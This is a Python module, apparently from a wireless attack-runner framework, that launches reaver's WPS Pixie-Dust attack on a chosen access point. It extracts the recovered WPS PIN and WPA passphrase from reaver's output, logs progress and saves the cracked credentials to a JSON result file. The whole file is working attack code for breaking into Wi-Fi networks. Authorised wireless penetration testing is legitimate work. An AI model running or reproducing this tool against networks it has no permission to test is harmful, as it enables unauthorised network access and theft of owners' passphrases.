"""WPS Pixie-Dust attack using reaver."""
from __future__ import annotations

import json
import os
import re
import subprocess
import time
from datetime import datetime, timezone
from pathlib import Path

from _log_util import log, ToolOutputLogger, drain_stdout

STATUS_INTERVAL = 10

IMPORTANT_RE = [
    re.compile(r"WPS PIN", re.I),
    re.compile(r"WPA PSK", re.I),
    re.compile(r"Trying pin", re.I),
    re.compile(r"Associated", re.I),
    re.compile(r"WARNING", re.I),
    re.compile(r"NACK", re.I),
    re.compile(r"Pixie", re.I),
]


def _is_stop_requested() -> bool:
    from attack_runner import is_stop_requested
    return is_stop_requested()


def run(config: dict, data_dir: Path) -> None:
    bssid = config["bssid"]
    channel = config["channel"]
    interface = config["interface"]
    timeout = config.get("timeout", 300)

    log_path = data_dir / "log.txt"

    cmd = [
        "reaver",
        "-i", interface,
        "-b", bssid,
        "-c", str(channel),
        "-K", "1",
        "-vv",
        "-F",
        "-N",
    ]

    log(log_path, "=== WPS Pixie-Dust ===")
    log(log_path, f"bssid:     {bssid}")
    log(log_path, f"channel:   {channel}")
    log(log_path, f"interface: {interface}")
    log(log_path, f"timeout:   {timeout}s")
    log(log_path, f"exec: {' '.join(cmd)}")

    _update_status(data_dir, "running", f"reaver Pixie-Dust on {bssid}")

    start = time.time()
    wps_pin: str | None = None
    wpa_psk: str | None = None
    stopped = False

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    tl = ToolOutputLogger(log_path, prefix="reaver> ")
    last_status = 0.0

    try:
        while time.time() - start < timeout:
            if proc.poll() is not None:
                drain_stdout(proc, tl, IMPORTANT_RE)
                log(log_path, f"reaver exited (code={proc.returncode})")
                break
            if _is_stop_requested():
                stopped = True
                log(log_path, "stop requested")
                break

            drain_stdout(proc, tl, IMPORTANT_RE)

            if tl.last_status:
                pin_match = _extract_pattern(tl.last_status, r"WPS PIN:\s*'?(\d+)'?")
                psk_match = _extract_pattern(tl.last_status, r"WPA PSK:\s*'([^']+)'")
                if pin_match and not wps_pin:
                    wps_pin = pin_match
                if psk_match and not wpa_psk:
                    wpa_psk = psk_match

            elapsed = time.time() - start
            if elapsed - last_status >= STATUS_INTERVAL:
                progress = f"Pixie-Dust ({int(elapsed)}s)"
                if tl.last_status:
                    progress += f" | {tl.last_status[:80]}"
                _update_status(data_dir, "running", progress)
                last_status = elapsed
            time.sleep(0.3)
    except Exception as e:
        log(log_path, f"error: {e}")
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=10)
            except subprocess.TimeoutExpired:
                proc.kill()

    duration = round(time.time() - start, 1)
    status_msg = "WPA PSK CRACKED" if wpa_psk else ("PIN found" if wps_pin else "no result")
    log(log_path, f"=== Result: {status_msg} | {duration}s ===")

    result = {
        "bssid": bssid,
        "wps_pin": wps_pin,
        "wpa_psk": wpa_psk,
        "success": wpa_psk is not None,
        "stopped_early": stopped,
        "duration_s": duration,
        "exit_code": proc.returncode,
    }
    (data_dir / "result.json").write_text(json.dumps(result, indent=2))


def _extract_pattern(text: str, pattern: str) -> str | None:
    m = re.search(pattern, text, re.IGNORECASE)
    return m.group(1) if m else None


def _update_status(data_dir: Path, status: str, progress: str) -> None:
    payload = {
        "status": status,
        "progress": progress,
        "started_at": os.environ.get("_RUNNER_STARTED_AT", ""),
        "updated_at": datetime.now(timezone.utc).isoformat(),
    }
    (data_dir / "status.json").write_text(json.dumps(payload, indent=2))
